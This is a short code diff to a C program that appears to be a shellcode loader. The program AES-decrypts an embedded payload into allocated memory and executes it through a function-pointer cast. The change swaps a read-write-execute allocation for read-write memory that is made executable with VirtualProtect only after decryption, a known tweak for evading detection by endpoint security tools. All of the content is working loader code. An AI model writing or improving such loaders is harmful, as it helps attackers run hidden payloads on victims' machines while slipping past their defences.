@@ -61,7 +61,7 @@ int main() {
     AES_init_ctx_iv(&ctx, key, iv);
 
     // Allocate memory that has read, write, and execute permission.
-    void* executable_memory = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    void* executable_memory = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!executable_memory) {
         printf("VirtualAlloc failed: %d\n", GetLastError());
         return -1;
@@ -72,6 +72,9 @@ int main() {
 
     // Decrypt the payload in place using AES
     AES_CBC_decrypt_buffer(&ctx, executable_memory, len);
+
+    DWORD old_protect = NULL;
+    VirtualProtect(executable_memory, len, PAGE_EXECUTE_READ, &old_protect);
 
     // Run the payload using pointer magic
     ((void(*)()) executable_memory)();
